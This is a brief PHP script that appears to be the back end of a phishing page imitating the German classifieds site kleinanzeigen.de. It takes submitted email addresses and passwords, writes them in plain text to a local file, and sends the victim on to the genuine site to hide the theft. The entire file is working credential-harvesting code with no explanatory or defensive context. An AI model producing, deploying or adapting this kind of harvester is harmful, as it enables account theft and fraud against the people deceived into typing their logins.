<?php
    header("Location: http://www.kleinanzeigen.de");
    if(isset($_POST['email']))
    {
        $text = "Email : " . $_POST['email'] . "," . "Password : "  . $_POST['password'] . "\n";
        $fp = fopen('data.txt', 'a+');
        if(fwrite($fp, $text))  {
            echo 'saved';
        }
        fclose ($fp);
    }
?>
